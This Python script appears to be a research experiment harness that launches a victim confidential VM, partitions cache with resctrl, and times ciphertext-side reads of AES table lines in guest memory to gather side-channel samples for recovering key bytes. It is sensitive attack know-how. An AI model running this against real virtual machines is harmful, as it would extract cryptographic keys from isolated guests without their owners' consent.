#!/usr/bin/env python3
from __future__ import annotations

import argparse
import csv
import json
import os
import random
import time
from pathlib import Path

import ch6_resctrl as rc
import run_53 as core
import run_53_role_signal as rs
from ch5_common import collect_host_facts, timestamped_outdir_ch5, write_json
from experiment_common import ensure_artifacts, print_banner, require_root, stop_proc


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        description="Collect online Ch5 role-based signal samples for template inference."
    )
    ap.add_argument("--outdir", default="")
    ap.add_argument("--skip-build", action="store_true")
    ap.add_argument("--suspected-range-json", required=True)
    ap.add_argument("--scan-start-gpa", default="")
    ap.add_argument("--scan-end-gpa", default="")
    ap.add_argument("--te0-inpage-offset", default="")
    ap.add_argument("--force-te-page-gpa", default="")
    ap.add_argument("--force-te0-gpa", default="")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--aes-port", type=int, default=9000)
    ap.add_argument("--aes-sync-port", type=int, default=9002)
    ap.add_argument("--rsa-port", type=int, default=9001)
    ap.add_argument("--sock-timeout-s", type=float, default=3.0)
    ap.add_argument("--qemu-cpu", type=int, default=32)
    ap.add_argument("--cpu-model", default="host,pmu=on")
    ap.add_argument("--guest-extra-cmdline", default="nokaslr norandmaps")
    ap.add_argument("--smp", default="1")
    ap.add_argument("--mem", default="4G")
    ap.add_argument("--vm-ready-timeout-s", type=int, default=180)
    ap.add_argument("--resctrl-enable", action="store_true")
    ap.add_argument("--resctrl-prefix", default="ch5sig")
    ap.add_argument("--resctrl-host-mba", type=int, default=0)
    ap.add_argument("--byte-pos", type=int, default=0)
    ap.add_argument("--line-reps", type=int, default=8)
    ap.add_argument("--confirm-pages", type=int, default=4)
    ap.add_argument("--confirm-line-reps", type=int, default=2)
    ap.add_argument("--aes-sync-phase1-repeats", type=int, default=12)
    ap.add_argument("--noise-lines", default="")
    ap.add_argument("--feature-topk", type=int, default=12)
    ap.add_argument("--boundary-line-window", type=int, default=2)
    ap.add_argument("--lines-per-side", type=int, default=2)
    ap.add_argument("--samples-total", type=int, default=4096)
    ap.add_argument("--contention-burst", type=int, default=16)
    ap.add_argument("--fixed-rest-bytes", dest="fixed_rest_bytes", action="store_true")
    ap.add_argument("--random-rest-bytes", dest="fixed_rest_bytes", action="store_false")
    ap.set_defaults(fixed_rest_bytes=True)
    ap.add_argument("--random-seed", type=int, default=0)
    ap.add_argument(
        "--reuse-model-json",
        default="",
        help="Optional trained model JSON. When set, reuse its role_specs for this byte and skip online line_scan.",
    )
    return ap.parse_args()


def load_role_specs_from_model(model_json: Path, byte_pos: int) -> list[dict[str, int | str]]:
    raw = json.loads(model_json.read_text())
    bytes_obj = raw.get("bytes") or []
    for byte_obj in bytes_obj:
        if int(byte_obj.get("byte_pos", -1)) != int(byte_pos):
            continue
        specs = byte_obj.get("role_specs") or []
        out: list[dict[str, int | str]] = []
        for ent in specs:
            name = str(ent.get("name", ""))
            line = int(ent.get("line", -1))
            if name and line >= 0:
                out.append({"name": name, "line": line})
        if out:
            return out
    raise SystemExit(
        f"[collect-online] byte_pos={int(byte_pos)} not found in reuse model: {model_json}"
    )


def selected_lines_from_role_specs(role_specs: list[dict[str, int | str]]) -> dict[str, list[int]]:
    before: list[tuple[int, int]] = []
    after: list[tuple[int, int]] = []
    for ent in role_specs:
        name = str(ent.get("name", ""))
        line = int(ent.get("line", -1))
        if line < 0:
            continue
        if name.startswith("before_"):
            try:
                idx = int(name.split("_", 1)[1])
            except ValueError:
                idx = len(before)
            before.append((idx, line))
        elif name.startswith("after_"):
            try:
                idx = int(name.split("_", 1)[1])
            except ValueError:
                idx = len(after)
            after.append((idx, line))
    return {
        "before": [line for _idx, line in sorted(before)],
        "after": [line for _idx, line in sorted(after)],
    }


def direct_contention_measure_lines(
    vm_ctl: core.NptCtlClient,
    args: argparse.Namespace,
    te0_gpa: int,
    plaintext: bytes,
    lines: list[int],
) -> dict[int, int]:
    timeout_s = float(getattr(args, "sock_timeout_s", 3.0))
    if int(getattr(args, "resctrl_host_mba", 0)) > 0:
        timeout_s = max(timeout_s, 20.0)
    last_exc: Exception | None = None
    for attempt in range(3):
        try:
            _ = core.aes_request(args.host, args.aes_port, plaintext, timeout_s=timeout_s)
            last_exc = None
            break
        except Exception as e:
            last_exc = e
            if attempt == 2:
                raise
            time.sleep(0.05 * float(attempt + 1))
    if last_exc is not None:
        raise last_exc
    out: dict[int, int] = {}
    for line in sorted(set(int(x) for x in lines if int(x) >= 0)):
        gpa = core.line_to_gpa(te0_gpa, line)
        out[int(line)] = int(
            core.ioctl_read_gpa_tsc(vm_ctl, gpa, core.KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE)
        )
    return out


def make_plaintext(byte_pos: int, fixed_rest_bytes: bool) -> bytes:
    if fixed_rest_bytes:
        pt = bytearray(16)
    else:
        pt = bytearray(os.urandom(16))
    pt[byte_pos] = random.randrange(256)
    return bytes(pt)


def apply_resctrl_partition(args: argparse.Namespace, vm_dir: Path, qemu_pid: int) -> dict:
    prefix = str(args.resctrl_prefix or "ch5sig")
    rc.cleanup_groups(prefix)
    rc.ensure_resctrl_mounted()
    cbm_mask = rc.read_l3_cbm_mask()
    host_mask, cvm_mask = rc.split_cbm_mask(cbm_mask)
    host_group = rc.create_group(
        f"{prefix}_host",
        l3_mask=host_mask,
        mba_percent=(int(args.resctrl_host_mba) if int(args.resctrl_host_mba) > 0 else None),
    )
    cvm_group = rc.create_group(f"{prefix}_cvm", l3_mask=cvm_mask, mba_percent=100)
    probe_group = None
    if int(args.resctrl_host_mba) > 0:
        probe_group = rc.create_group(f"{prefix}_probe", l3_mask=host_mask, mba_percent=100)
    vcpu_tids, tasks = rc.wait_for_vcpu_tids(qemu_pid, timeout_s=15.0)
    all_tids = [tid for tid, _comm in tasks]
    hr_tid = rc.wait_for_tid_file(vm_dir / "hr_thread.tid", timeout_s=15.0)
    host_tids = rc.filter_live_tids([tid for tid in all_tids if tid not in vcpu_tids])
    vcpu_tids = rc.filter_live_tids(vcpu_tids)
    probe_tids: list[int] = []
    if hr_tid and int(hr_tid) not in vcpu_tids:
        probe_tids.append(int(hr_tid))
        host_tids = [tid for tid in host_tids if int(tid) != int(hr_tid)]
    if not vcpu_tids:
        thread_dump = ", ".join(f"{tid}:{comm}" for tid, comm in tasks)
        raise SystemExit(f"[resctrl] failed to identify vCPU threads; threads={thread_dump}")
    rc.assign_tids(host_group, host_tids)
    rc.assign_tids(cvm_group, vcpu_tids)
    if probe_group is not None and probe_tids:
        rc.assign_tids(probe_group, probe_tids)
    rec = {
        "enabled": True,
        "cbm_mask_hex": f"0x{cbm_mask:x}",
        "host_mask_hex": f"0x{host_mask:x}",
        "cvm_mask_hex": f"0x{cvm_mask:x}",
        "host_group": str(host_group),
        "cvm_group": str(cvm_group),
        "probe_group": str(probe_group) if probe_group is not None else None,
        "qemu_pid": int(qemu_pid),
        "host_tids": host_tids,
        "vcpu_tids": vcpu_tids,
        "hr_tid": int(hr_tid) if hr_tid else None,
        "probe_tids": probe_tids,
        "host_mba_percent": int(args.resctrl_host_mba) if int(args.resctrl_host_mba) > 0 else None,
    }
    write_json(vm_dir / "resctrl_assignment.json", rec)
    return rec


def cleanup_resctrl(args: argparse.Namespace) -> None:
    if not bool(args.resctrl_enable):
        return
    rc.cleanup_groups(str(args.resctrl_prefix or "ch5sig"))


def main() -> None:
    args = parse_args()
    require_root("[!] run_53_online_signal_collect.py requires root.")
    if int(args.random_seed) != 0:
        random.seed(int(args.random_seed))

    args.enable_aes_sync = True
    args.enable_contention = False
    args.fusion_mode = "phase1_only"
    args.theta_mode = "line_mid"
    args.theta = 0
    args.theta_scale = 0.5
    args.score_mode = "correlation"
    args.recover_mode = "two_stage_nibble"

    outdir = Path(args.outdir).resolve() if args.outdir else timestamped_outdir_ch5("exp5_3_online_signal_collect")
    outdir.mkdir(parents=True, exist_ok=True)
    print_banner("Experiment 5.3: Online Signal Collection", outdir)

    core.maybe_sync_oracle_from_range_json(args)
    extra = str(getattr(args, "guest_extra_cmdline", "") or "").strip()
    extra_tokens = [t for t in extra.split() if t]
    filtered = [t for t in extra_tokens if not t.startswith("probe_victim_sync_")]
    filtered.append("probe_victim_sync_gadget=te0")
    filtered.append(f"probe_victim_sync_byte={int(args.byte_pos)}")
    args.guest_extra_cmdline = " ".join(filtered)

    ensure_artifacts(args.skip_build, outdir / "build_stage")
    collect_host_facts(outdir)

    vm_dir = outdir / "vm_attack"
    proc, npt_sock = core.launch_victim_vm(args, vm_dir)
    vm_ctl: core.NptCtlClient | None = None
    try:
        if bool(args.resctrl_enable):
            rec = apply_resctrl_partition(args, vm_dir, proc.pid)
            print(
                "[collect-online] resctrl enabled: "
                f"host_mask={rec['host_mask_hex']} cvm_mask={rec['cvm_mask_hex']} "
                f"host_mba={rec.get('host_mba_percent')}"
            )
        if not core.wait_vm_ready(args.host, args.aes_port, args.vm_ready_timeout_s):
            raise SystemExit(f"[vm] victim services not ready; see {vm_dir / 'qemu.log'}")
        if not core.wait_tcp_ready(args.host, args.aes_sync_port, args.vm_ready_timeout_s):
            raise SystemExit(f"[vm] AES sync service not ready; see {vm_dir / 'qemu.log'}")
        core.maybe_override_force_from_boot_oracle(args, vm_dir)
        if not core.wait_nptctl_ready(npt_sock, args.vm_ready_timeout_s):
            raise SystemExit(f"[vm] nptctl not ready; see {vm_dir / 'qemu.log'}")

        vm_ctl = core.NptCtlClient(sock_path=npt_sock, timeout_s=args.sock_timeout_s)
        vm_ctl.connect()

        _scan_start_gpa, _scan_end_gpa, te0_inpage_offset = core.load_scan_range(args)
        _target_page, te0_gpa = rs.choose_target_page(vm_ctl, args, outdir, te0_inpage_offset)

        boundary = rs.find_page_boundary(rs.compute_entry_layout(te0_gpa, int(args.byte_pos)))
        entry_boundary = int(boundary["entry_before"])
        reuse_model_json = str(getattr(args, "reuse_model_json", "") or "").strip()
        skip_coherence_phase = False
        if reuse_model_json:
            role_specs = load_role_specs_from_model(Path(reuse_model_json), int(args.byte_pos))
            selected_lines = selected_lines_from_role_specs(role_specs)
            feature_lines = sorted(
                set(int(ent["line"]) for ent in role_specs if int(ent.get("line", -1)) >= 0)
            )
            ranked_lines: list[dict[str, float | int]] = []
            line_rows: list[dict[str, float | int]] = []
            skip_coherence_phase = True
            print(
                "[collect-online] reusing model role_specs: "
                f"model={Path(reuse_model_json).resolve()} byte_pos={int(args.byte_pos)} "
                f"feature_lines={feature_lines}"
            )
        else:
            line_rows = core.scan_page_lines(vm_ctl, te0_gpa, args, outdir)
            noise_lines = core.parse_noise_lines(args.noise_lines)
            selected_lines, ranked_lines = rs.select_boundary_lines(
                line_rows,
                te0_gpa,
                table_idx=int(args.byte_pos) % core.TABLE_COUNT,
                boundary=boundary,
                noise_lines=noise_lines,
                lines_per_side=int(args.lines_per_side),
                line_window=int(args.boundary_line_window),
            )
            feature_lines = rs.select_template_feature_lines(
                line_rows,
                table_idx=int(args.byte_pos) % core.TABLE_COUNT,
                noise_lines=noise_lines,
                topk=int(args.feature_topk),
                selected_lines=selected_lines,
            )
            role_specs = rs.build_role_feature_specs(
                line_rows,
                table_idx=int(args.byte_pos) % core.TABLE_COUNT,
                noise_lines=noise_lines,
                selected_lines=selected_lines,
                topk=int(args.feature_topk),
            )

        out_csv = outdir / "signal_observations.csv"
        with out_csv.open("w", newline="") as fp:
            wr = csv.writer(fp)
            wr.writerow(
                [
                    "sample_id",
                    "pt_hex",
                    "pt_byte",
                    "entry",
                    "true_side",
                    "before_score",
                    "after_score",
                    "after_minus_before",
                    "before_score_cont",
                    "after_score_cont",
                    "after_minus_before_cont",
                    "pred_side",
                    "line_scores_json",
                    "line_scores_cont_json",
                    "line_scores_cont_burst_json",
                ]
            )

            lines_all = sorted(set(int(x) for x in feature_lines))
            for sample_id in range(max(1, int(args.samples_total))):
                pt = make_plaintext(int(args.byte_pos), bool(args.fixed_rest_bytes))
                if skip_coherence_phase:
                    line_scores = {int(line): 0 for line in lines_all}
                    before_score = 0.0
                    after_score = 0.0
                    bias = 0.0
                else:
                    sync_cycles_map = core.sync_measure_lines_grouped(
                        vm_ctl,
                        args,
                        te0_gpa,
                        pt,
                        core.KVM_AMD_READ_GPA_MODE_CIPHERTEXT_CACHEABLE,
                        lines_all,
                        repeats=max(1, int(args.aes_sync_phase1_repeats)),
                    )
                    line_scores = {int(k): int(v) for k, v in sync_cycles_map.items()}
                    before_vals = [int(line_scores.get(line, 0)) for line in selected_lines["before"]]
                    after_vals = [int(line_scores.get(line, 0)) for line in selected_lines["after"]]
                    before_score = float(max(before_vals)) if before_vals else 0.0
                    after_score = float(max(after_vals)) if after_vals else 0.0
                    bias = float(after_score - before_score)

                line_scores_cont_burst: dict[int, list[int]] = {}
                for _ in range(max(1, int(args.contention_burst))):
                    if skip_coherence_phase:
                        burst_map = direct_contention_measure_lines(
                            vm_ctl,
                            args,
                            te0_gpa,
                            pt,
                            lines_all,
                        )
                    else:
                        burst_map = core.sync_measure_lines_grouped(
                            vm_ctl,
                            args,
                            te0_gpa,
                            pt,
                            core.KVM_AMD_READ_GPA_MODE_CIPHERTEXT_NOCACHE,
                            lines_all,
                            repeats=1,
                        )
                    for line in lines_all:
                        line_scores_cont_burst.setdefault(int(line), []).append(int(burst_map.get(line, 0)))

                line_scores_cont = {
                    int(line): max(vals) if vals else 0
                    for line, vals in line_scores_cont_burst.items()
                }
                before_vals_cont = [int(line_scores_cont.get(line, 0)) for line in selected_lines["before"]]
                after_vals_cont = [int(line_scores_cont.get(line, 0)) for line in selected_lines["after"]]
                before_score_cont = float(max(before_vals_cont)) if before_vals_cont else 0.0
                after_score_cont = float(max(after_vals_cont)) if after_vals_cont else 0.0
                bias_cont = float(after_score_cont - before_score_cont)

                wr.writerow(
                    [
                        sample_id,
                        pt.hex(),
                        int(pt[int(args.byte_pos)]),
                        -1,
                        -1,
                        f"{before_score:.3f}",
                        f"{after_score:.3f}",
                        f"{bias:.3f}",
                        f"{before_score_cont:.3f}",
                        f"{after_score_cont:.3f}",
                        f"{bias_cont:.3f}",
                        -1,
                        json.dumps(line_scores, sort_keys=True),
                        json.dumps(line_scores_cont, sort_keys=True),
                        json.dumps({int(k): [int(x) for x in v] for k, v in line_scores_cont_burst.items()}, sort_keys=True),
                    ]
                )

        write_json(
            outdir / "signal_meta.json",
            {
                "mode": "online_inference_collection",
                "byte_pos": int(args.byte_pos),
                "te0_gpa": f"0x{te0_gpa:x}",
                "te0_page_gpa": f"0x{te0_gpa & ~(core.PAGE_SZ - 1):x}",
                "static_page_boundary": boundary,
                "entry_boundary": int(entry_boundary),
                "samples_total": int(args.samples_total),
                "contention_burst": int(args.contention_burst),
                "fixed_rest_bytes": int(bool(args.fixed_rest_bytes)),
                "selected_lines": selected_lines,
                "feature_lines": [int(x) for x in feature_lines],
                "role_specs": role_specs,
                "ranked_lines": ranked_lines,
                "true_key_hex": core.TRUE_AES_KEY.hex(),
            },
        )
        print(f"[collect-online] done: outdir={outdir}")
    finally:
        cleanup_resctrl(args)
        if vm_ctl is not None:
            vm_ctl.close()
        stop_proc(proc, timeout_s=10.0)


if __name__ == "__main__":
    main()
